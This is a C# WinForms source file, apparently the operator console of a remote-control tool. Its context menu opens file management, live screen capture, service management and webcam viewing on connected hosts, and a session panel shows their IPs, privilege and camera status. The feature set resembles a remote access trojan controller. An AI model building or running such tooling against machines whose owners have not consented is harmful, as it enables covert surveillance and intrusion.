using System;
using System.Collections.Generic;
using System.Windows.Forms;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Request;

namespace RemoteControl.SubController
{
    partial class FrmSubMain
    {
        private ContextMenuStrip contextMenuHost;
        private Dictionary<string, FrmScreenViewer> _screenForms = new Dictionary<string, FrmScreenViewer>();
        private Dictionary<string, FrmVideoViewer> _videoForms = new Dictionary<string, FrmVideoViewer>();
        private Dictionary<string, FrmFileManager> _fileForms = new Dictionary<string, FrmFileManager>();
        private Dictionary<string, FrmServiceManager> _serviceForms = new Dictionary<string, FrmServiceManager>();

        private void InitContextMenu()
        {
            contextMenuHost = new ContextMenuStrip();
            contextMenuHost.Items.Add("文件管理(&F)", null, onMenuFileManager);
            contextMenuHost.Items.Add("屏幕监控(&S)", null, onMenuScreenCapture);
            contextMenuHost.Items.Add("高清屏幕(&H)", null, onMenuHDScreen);
            contextMenuHost.Items.Add("系统管理(&M)", null, onMenuSystemManager);
            contextMenuHost.Items.Add("视频查看(&V)", null, onMenuVideoCapture);
            contextMenuHost.Items.Add(new ToolStripSeparator());
            contextMenuHost.Items.Add("更改备注(&R)", null, onMenuChangeRemark);
            contextMenuHost.Items.Add("修改分组(&G)", null, onMenuChangeGroup);
            contextMenuHost.Items.Add("创建分组(&N)", null, onMenuCreateGroup);
            contextMenuHost.Items.Add("会话管理(&I)", null, onMenuSessionInfo);
        }

        private void onMenuFileManager(object sender, EventArgs e)
        {
            if (_currentSession == null) return;
            OpenFileManager(_currentSession);
        }

        private void onMenuScreenCapture(object sender, EventArgs e)
        {
            if (_currentSession == null) return;
            OpenScreenCapture(3);
        }

        private void onMenuHDScreen(object sender, EventArgs e)
        {
            if (_currentSession == null) return;
            OpenScreenCapture(5);
        }

        private void onMenuSystemManager(object sender, EventArgs e)
        {
            if (_currentSession == null) return;
            string sid = _currentSession.SocketId;
            FrmServiceManager frm;
            if (_serviceForms.TryGetValue(sid, out frm) && !frm.IsDisposed)
            {
                frm.Activate();
                return;
            }
            string host = _currentSession.HostName ?? _currentSession.GetExternalIP();
            frm = new FrmServiceManager(_currentSession, host);
            frm.FormClosed += (s, ev) => _serviceForms.Remove(sid);
            _serviceForms[sid] = frm;
            frm.Show();
        }

        private void onMenuVideoCapture(object sender, EventArgs e)
        {
            if (_currentSession == null) return;
            OpenVideoCapture();
        }

        private void onMenuChangeRemark(object sender, EventArgs e)
        {
            if (_currentSession == null) return;
            string current = _currentSession.Remark ?? "";
            string input = ShowInputDialog("更改备注", "请输入新备注:", current);
            if (input != null)
            {
                _currentSession.SetRemark(input);
                UpsertDashboardClient(_currentSession);
                UpdateGroupCounters();
            }
        }

        private void onMenuCreateGroup(object sender, EventArgs e)
        {
            string input = ShowInputDialog("创建分组", "请输入分组名称:", "");
            if (!string.IsNullOrWhiteSpace(input))
            {
                // 创建空分组标签
                EnsureGroupTab(input.Trim(), 0);
            }
        }

        private void onMenuChangeGroup(object sender, EventArgs e)
        {
            if (_currentSession == null) return;
            string current = GetSessionGroupName(_currentSession);
            string input = ShowInputDialog("修改分组", "请输入分组名称（留空回到默认）:", current == DefaultGroupName ? "" : current);
            if (input != null)
            {
                SetSessionGroup(_currentSession, input);
            }
        }

        private void onMenuSessionInfo(object sender, EventArgs e)
        {
            if (_currentSession == null) return;
            string info = string.Format(
                "主机名: {0}\r\n用户: {1}\r\n外网IP: {2}\r\n内网IP: {3}\r\n系统: {4}\r\n权限: {5}\r\n摄像头: {6}\r\n备注: {7}",
                Safe(_currentSession.HostName),
                Safe(_currentSession.UserName),
                Safe(_currentSession.GetExternalIP()),
                Safe(_currentSession.LocalIP),
                Safe(_currentSession.OSVersion),
                Safe(_currentSession.Privilege),
                Safe(_currentSession.CameraStatus),
                Safe(_currentSession.Remark));
            MessageBox.Show(info, "会话信息 - " + Safe(_currentSession.HostName),
                MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void OpenScreenCapture(int fps)
        {
            string sid = _currentSession.SocketId;
            FrmScreenViewer frm;
            if (_screenForms.TryGetValue(sid, out frm) && !frm.IsDisposed)
            {
                frm.Activate();
                return;
            }

            frm = new FrmScreenViewer(_currentSession, fps);
            frm.FormClosed += (s, ev) => _screenForms.Remove(sid);
            _screenForms[sid] = frm;
            frm.Show();

            var req = new RequestStartGetScreen();
            req.fps = fps;
            _currentSession.Send(ePacketType.PACKET_START_CAPTURE_SCREEN_REQUEST, req);
        }

        private void OpenVideoCapture()
        {
            string sid = _currentSession.SocketId;
            FrmVideoViewer frm;
            if (_videoForms.TryGetValue(sid, out frm) && !frm.IsDisposed)
            {
                frm.Activate();
                return;
            }

            frm = new FrmVideoViewer(_currentSession);
            frm.FormClosed += (s, ev) => _videoForms.Remove(sid);
            _videoForms[sid] = frm;
            frm.Show();
        }

        private void OpenFileManager(SocketSession session)
        {
            string sid = session.SocketId;
            FrmFileManager frm;
            if (_fileForms.TryGetValue(sid, out frm) && !frm.IsDisposed)
            {
                frm.Activate();
                return;
            }

            frm = new FrmFileManager(session);
            frm.FormClosed += (s, ev) => _fileForms.Remove(sid);
            _fileForms[sid] = frm;
            frm.Show();
        }

        private static string ShowInputDialog(string title, string prompt, string defaultValue)
        {
            Form form = new Form();
            form.Text = title;
            form.Size = new System.Drawing.Size(400, 160);
            form.StartPosition = FormStartPosition.CenterParent;
            form.FormBorderStyle = FormBorderStyle.FixedDialog;
            form.MaximizeBox = false;
            form.MinimizeBox = false;

            Label label = new Label() { Left = 15, Top = 15, Text = prompt, AutoSize = true };
            TextBox textBox = new TextBox() { Left = 15, Top = 40, Width = 350, Text = defaultValue };
            Button ok = new Button() { Text = "确定", Left = 200, Top = 80, Width = 75, DialogResult = DialogResult.OK };
            Button cancel = new Button() { Text = "取消", Left = 290, Top = 80, Width = 75, DialogResult = DialogResult.Cancel };

            form.Controls.AddRange(new Control[] { label, textBox, ok, cancel });
            form.AcceptButton = ok;
            form.CancelButton = cancel;

            if (form.ShowDialog() == DialogResult.OK)
                return textBox.Text.Trim();
            return null;
        }
    }
}
